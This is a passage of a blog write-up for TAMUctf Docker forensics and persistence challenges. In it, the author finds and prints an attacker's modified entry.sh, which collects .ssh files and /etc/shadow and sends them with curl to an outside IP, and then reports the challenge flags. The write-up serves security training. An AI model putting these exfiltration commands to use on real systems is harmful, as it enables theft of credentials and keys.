+</span></span><span class=line><span class=cl>│       └── apt
+</span></span><span class=line><span class=cl>│           └── sources.list
+</span></span><span class=line><span class=cl>├── link
+</span></span><span class=line><span class=cl>├── lower
+</span></span><span class=line><span class=cl>└── work
+</span></span></code></pre></td></tr></table></div></div><p>The folder that will interest us will be the <code>diff</code> one, which bears its name well because it will record the differences between each container version. That&rsquo;s why Docker quickly becomes greedy in terms of disk size.</p><p>To find what interests me, I did something not very skilled, but which has is exhaustive:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/overlay2/0dfa81ec47cc9d78701052f24ce164b114279abb425af227eb7664624d64c848/diff/:
+</span></span><span class=line><span class=cl>etc  tmp  usr  var
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/overlay2/101c6052088fb1d7b9bf6331ae2e3a052a5480b14a5e48e43eb465914880cd68/diff/:
+</span></span><span class=line><span class=cl>etc  var
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/overlay2/146731568c44e1ab0d9a339166cd67189b51f6e0166b301f86557aef05b0d55d/diff/:
+</span></span><span class=line><span class=cl>etc  lib  tmp  usr  var
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/overlay2/146d15695f9f4187544729bbd71682fe0fcebce1cd65becfc74f64f3278ea370/diff/:
+</span></span><span class=line><span class=cl>run
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/overlay2/146d15695f9f4187544729bbd71682fe0fcebce1cd65becfc74f64f3278ea370-init/diff/:
+</span></span><span class=line><span class=cl>dev  etc
+</span></span><span class=line><span class=cl><span class=o>[</span>LOT OF RESUUUUUUUUULT<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>But at a quick glance, I saw that an <code>entry.sh</code> file had been modified, nothing else on the docker&rsquo;s filesystem:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/overlay2/5d6f4f20fa15dd9d3960358e9b6e257821e3ab277a6ff4db92163d926e5c5e8a/diff/:
+</span></span><span class=line><span class=cl>entry.sh
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>➜  microservices cat aaa/var/lib/docker/overlay2/5d6f4f20fa15dd9d3960358e9b6e257821e3ab277a6ff4db92163d926e5c5e8a/diff/entry.sh 
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/sh</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -n <span class=s2>&#34;</span><span class=nv>$DATABASE_URL</span><span class=s2>&#34;</span> <span class=o>]</span>
+</span></span><span class=line><span class=cl>    <span class=k>then</span>
+</span></span><span class=line><span class=cl>    <span class=nv>database</span><span class=o>=</span><span class=sb>`</span><span class=nb>echo</span> <span class=nv>$DATABASE_URL</span> <span class=p>|</span> awk -F<span class=o>[</span>@//<span class=o>]</span> <span class=s1>&#39;{print $4}&#39;</span><span class=sb>`</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Waiting for </span><span class=nv>$database</span><span class=s2> to be ready&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> ! mysqladmin ping -h <span class=nv>$database</span> --silent<span class=p>;</span> <span class=k>do</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Show some progress</span>
+</span></span><span class=line><span class=cl>        <span class=nb>echo</span> -n <span class=s1>&#39;.&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        sleep 1<span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>done</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$database</span><span class=s2> is ready&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=c1># Give it another second.</span>
+</span></span><span class=line><span class=cl>    sleep 1<span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>mysql -uroot -h db -p351BrE7aTQE8 -e <span class=s1>&#39;CREATE DATABASE customers;\
+</span></span></span><span class=line><span class=cl><span class=s1>                                USE customers;\
+</span></span></span><span class=line><span class=cl><span class=s1>                                CREATE TABLE customer_info(LastName varchar(255), FirstName varchar(255), Email varchar(255), CreditCard varchar(255), Password varchar(255));\
+</span></span></span><span class=line><span class=cl><span class=s1>                                INSERT INTO customer_info VALUES (&#34;Meserole&#34;, &#34;Andrew&#34;, &#34;A@A.com&#34;, &#34;378282246310005&#34;, &#34;badpass1&#34;);\
+</span></span></span><span class=line><span class=cl><span class=s1>                                INSERT INTO customer_info VALUES (&#34;Billy&#34;, &#34;Bob&#34;, &#34;B@A.com&#34;, &#34;371449635398431&#34;, &#34;badpass2&#34;);\
+</span></span></span><span class=line><span class=cl><span class=s1>                                INSERT INTO customer_info VALUES (&#34;Suzy&#34;, &#34;Joe&#34;, &#34;S@A.com&#34;, &#34;378734493671000&#34;, &#34;badpass3&#34;);\
+</span></span></span><span class=line><span class=cl><span class=s1>                                INSERT INTO customer_info VALUES (&#34;John&#34;, &#34;Doe&#34;, &#34;J@A.com&#34;, &#34;6011000990139424&#34;, &#34;badpass4&#34;);\
+</span></span></span><span class=line><span class=cl><span class=s1>                                INSERT INTO customer_info VALUES (&#34;Frank&#34;, &#34;Ferter&#34;, &#34;F@A.com&#34;, &#34;3566002020360505&#34;, &#34;badpass5&#34;);\
+</span></span></span><span class=line><span class=cl><span class=s1>                                INSERT INTO customer_info VALUES (&#34;Orange&#34;, &#34;Chair&#34;, &#34;O@A.com&#34;, &#34;4012888888881881&#34;, &#34;badpass6&#34;);\
+</span></span></span><span class=line><span class=cl><span class=s1>                                INSERT INTO customer_info VALUES (&#34;Face&#34;, &#34;Book&#34;, &#34;C@A.com&#34;, &#34;5105105105105100&#34;, &#34;badpass7&#34;);\&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>find /tmp/home -type d -name <span class=s2>&#34;.ssh&#34;</span> 2&gt; /dev/null &gt; /tmp/ljkasdhg
+</span></span><span class=line><span class=cl>find /tmp/root -type d -name <span class=s2>&#34;.ssh&#34;</span> 2&gt; /dev/null &gt;&gt; /tmp/ljkasdhg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sleep 2m<span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=nb>read</span> line<span class=p>;</span> <span class=k>do</span>
+</span></span><span class=line><span class=cl>    find <span class=nv>$line</span> -type f -exec curl -k -F <span class=s1>&#39;data=@{}&#39;</span> https://10.91.9.93/ <span class=se>\;</span>
+</span></span><span class=line><span class=cl><span class=k>done</span> &lt; /tmp/ljkasdhg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>curl -k -F <span class=s1>&#39;data=@/tmp/etc/shadow&#39;</span> https://10.91.9.93/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>service apache2 stop<span class=p>;</span>
+</span></span><span class=line><span class=cl>apache2 -D FOREGROUND<span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/K90ckojkohXfW/giphy.gif data-srcset="https://media.giphy.com/media/K90ckojkohXfW/giphy.gif, https://media.giphy.com/media/K90ckojkohXfW/giphy.gif 1.5x, https://media.giphy.com/media/K90ckojkohXfW/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/K90ckojkohXfW/giphy.gif title=https://media.giphy.com/media/K90ckojkohXfW/giphy.gif></p><p>It&rsquo;s Christmas, we found the file modified by the attacker and what allowed him to do yolo with the system. He modified database entries, retrieved <code>/etc/shadow</code>, information about users&rsquo; <code>.ssh</code> folders.</p><p>The compromised users are therefore:</p><blockquote><p>Flag 1: Billy,Face,Frank,John,Meserole,Orange,Suzy</p></blockquote><p>The file that was used to extract data from the data is therefore <code>entry.sh</code>:</p><blockquote><p>Flag 2: 14b0d800ce6f2882a6f058b45fc500c8</p></blockquote><p>Still in the same perspective as to find the <code>entry.sh</code>, I listed the diff folders. In fact, I thought we were looking for a SQL backup or something like that, modifying a database without getting the backups is like ransomware that doesn&rsquo;t delete clear files&mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/:
+</span></span><span class=line><span class=cl>data-dump.sql  run  tmp
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>➜  microservices cat aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
+</span></span><span class=line><span class=cl><span class=o>[</span>BAD IDEA TOO MUCH DATA<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>➜  microservices md5sum aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
+</span></span><span class=line><span class=cl>6d47d74d66e96c9bce2720c8a56f2558  aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>Flag 3: 6d47d74d66e96c9bce2720c8a56f2558</p></blockquote><h2 id=4_persistence>4_Persistence</h2><blockquote><p>Thanks for that information. We are working on how to recover from this breach. One of the things we need to do is remove any backdoors placed by the attacker. Can you identify what the attacker left behind?</p></blockquote><ul><li>What is the new user that was created?</li><li>What is the full name of the new docker image that was pulled down?</li></ul><p>This challenge was rather simple given the information found earlier. In step 2 (2_Analysis), I saw that the $HOME of the <code>dev</code> user is <code>/root</code>, so we suspect that it is the new user :</p><blockquote><p>Flag 1: dev</p></blockquote><p>Then, when I started investigating on docker containers (cf. 3_Forensics), I saw an image <strong>Kali</strong> named: <code>tamuctf/kaliimage</code>.</p><blockquote><p>Flag 2: tamuctf/kaliimage</p></blockquote></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>
